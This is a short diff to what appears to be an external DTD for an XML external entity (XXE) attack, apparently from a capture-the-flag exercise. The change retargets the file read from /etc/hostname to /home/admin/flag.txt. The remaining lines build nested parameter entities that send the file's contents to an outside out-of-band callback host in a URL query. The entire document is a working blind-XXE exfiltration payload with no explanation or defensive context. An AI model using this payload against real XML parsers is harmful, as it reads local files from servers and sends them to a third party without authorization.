@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % file SYSTEM "file:///home/admin/flag.txt">
 <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://mndtkuhim0wvz53sfyji9u5jhan1byzn.net-spi.com/?x=%file;'>">
 %eval;
 %exfil;
